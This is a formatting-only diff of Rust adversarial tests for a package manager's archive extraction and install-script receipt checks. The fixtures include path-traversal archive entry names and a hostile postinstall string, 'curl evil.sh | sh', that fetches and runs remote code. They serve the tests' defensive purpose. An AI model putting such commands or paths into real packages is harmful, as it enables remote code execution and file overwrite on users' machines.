@@ -90,11 +90,7 @@ fn extract(tar_bytes: &[u8], dest: &std::path::Path) -> Result<(), String> {
 }
 
 fn tmpdir(tag: &str) -> std::path::PathBuf {
-    let d = std::env::temp_dir().join(format!(
-        "jhol-adv-{}-{}",
-        tag,
-        std::process::id()
-    ));
+    let d = std::env::temp_dir().join(format!("jhol-adv-{}-{}", tag, std::process::id()));
     let _ = std::fs::remove_dir_all(&d);
     std::fs::create_dir_all(&d).unwrap();
     d
@@ -135,9 +131,7 @@ fn adv_absolute_path_rejected() {
 // 3. Backslash paths (Windows separator smuggling on unix) rejected.
 #[test]
 fn adv_backslash_path_rejected() {
-    let t = raw_tar(vec![
-        ("package\\..\\evil.txt", b'0', "", b"pwn".to_vec()),
-    ]);
+    let t = raw_tar(vec![("package\\..\\evil.txt", b'0', "", b"pwn".to_vec())]);
     let d = tmpdir("bslash");
     let err = extract(&gzip(&t), &d).unwrap_err();
     assert!(err.contains("Unsafe archive entry path"), "got: {}", err);
@@ -146,9 +140,7 @@ fn adv_backslash_path_rejected() {
 // 4. Drive-colon paths rejected.
 #[test]
 fn adv_drive_colon_rejected() {
-    let t = raw_tar(vec![
-        ("package/C:/evil.txt", b'0', "", b"pwn".to_vec()),
-    ]);
+    let t = raw_tar(vec![("package/C:/evil.txt", b'0', "", b"pwn".to_vec())]);
     let d = tmpdir("colon");
     let err = extract(&gzip(&t), &d).unwrap_err();
     assert!(err.contains("Unsafe archive entry path"), "got: {}", err);
@@ -183,9 +175,24 @@ fn adv_escaping_symlink_rejected() {
 #[test]
 fn adv_benign_symlink_allowed() {
     let t = build_tar(vec![
-        ("package/package.json", tar::EntryType::Regular, None, manifest("x", "1.0.0")),
-        ("package/sub/real.txt", tar::EntryType::Regular, None, b"data".to_vec()),
-        ("package/sub/link.txt", tar::EntryType::Symlink, Some("./real.txt"), vec![]),
+        (
+            "package/package.json",
+            tar::EntryType::Regular,
+            None,
+            manifest("x", "1.0.0"),
+        ),
+        (
+            "package/sub/real.txt",
+            tar::EntryType::Regular,
+            None,
+            b"data".to_vec(),
+        ),
+        (
+            "package/sub/link.txt",
+            tar::EntryType::Symlink,
+            Some("./real.txt"),
+            vec![],
+        ),
     ]);
     let d = tmpdir("benign");
     extract(&gzip(&t), &d).expect("benign tarball must extract");
@@ -230,9 +237,24 @@ fn adv_bin_outside_package_rejected() {
 #[test]
 fn adv_duplicate_entries_no_panic() {
     let t = build_tar(vec![
-        ("package/package.json", tar::EntryType::Regular, None, manifest("x", "1.0.0")),
-        ("package/dup.txt", tar::EntryType::Regular, None, b"one".to_vec()),
-        ("package/dup.txt", tar::EntryType::Regular, None, b"two".to_vec()),
+        (
+            "package/package.json",
+            tar::EntryType::Regular,
+            None,
+            manifest("x", "1.0.0"),
+        ),
+        (
+            "package/dup.txt",
+            tar::EntryType::Regular,
+            None,
+            b"one".to_vec(),
+        ),
+        (
+            "package/dup.txt",
+            tar::EntryType::Regular,
+            None,
+            b"two".to_vec(),
+        ),
     ]);
     let d = tmpdir("dup");
     extract(&gzip(&t), &d).expect("duplicate entries must extract");
@@ -245,9 +267,12 @@ fn adv_duplicate_entries_no_panic() {
 fn adv_huge_manifest_extracts() {
     let mut big = manifest("x", "1.0.0");
     big.extend(vec![b' '; 8 * 1024 * 1024]);
-    let t = build_tar(vec![
-        ("package/package.json", tar::EntryType::Regular, None, big),
-    ]);
+    let t = build_tar(vec![(
+        "package/package.json",
+        tar::EntryType::Regular,
+        None,
+        big,
+    )]);
     let d = tmpdir("huge");
     extract(&gzip(&t), &d).expect("huge manifest must extract");
     let manifest_size = d.join("package.json").metadata().unwrap().len();
@@ -261,9 +286,19 @@ fn adv_receipt_tamper_invalidates_approval() {
     use crate::lifecycle::{script_receipt, ScriptOutcome};
     let name = "tampered-pkg";
     let v1 = script_receipt(name, "1.0.0", "{\"postinstall\":\"echo ok\"}", "sha512-abc");
-    let v2 = script_receipt(name, "1.0.0", "{\"postinstall\":\"curl evil.sh | sh\"}", "sha512-abc");
+    let v2 = script_receipt(
+        name,
+        "1.0.0",
+        "{\"postinstall\":\"curl evil.sh | sh\"}",
+        "sha512-abc",
+    );
     assert_ne!(v1, v2, "changed script text must change the receipt");
-    let v3 = script_receipt(name, "1.0.0", "{\"postinstall\":\"echo ok\"}", "sha512-DIFFERENT");
+    let v3 = script_receipt(
+        name,
+        "1.0.0",
+        "{\"postinstall\":\"echo ok\"}",
+        "sha512-DIFFERENT",
+    );
     assert_ne!(v1, v3, "changed tarball integrity must change the receipt");
     let v4 = script_receipt(name, "1.0.1", "{\"postinstall\":\"echo ok\"}", "sha512-abc");
     assert_ne!(v1, v4, "changed version must change the receipt");
@@ -275,7 +310,17 @@ fn adv_receipt_tamper_invalidates_approval() {
 //     receipt does not.
 #[test]
 fn adv_name_allowlist_is_weaker_than_receipt() {
-    let legit = script_receipt("lodash", "4.17.21", "{\"postinstall\":\"true\"}", "sha512-good");
-    let hostile = script_receipt("lodash", "4.17.21", "{\"postinstall\":\"evil\"}", "sha512-evil");
+    let legit = script_receipt(
+        "lodash",
+        "4.17.21",
+        "{\"postinstall\":\"true\"}",
+        "sha512-good",
+    );
+    let hostile = script_receipt(
+        "lodash",
+        "4.17.21",
+        "{\"postinstall\":\"evil\"}",
+        "sha512-evil",
+    );
     assert_ne!(legit, hostile);
 }
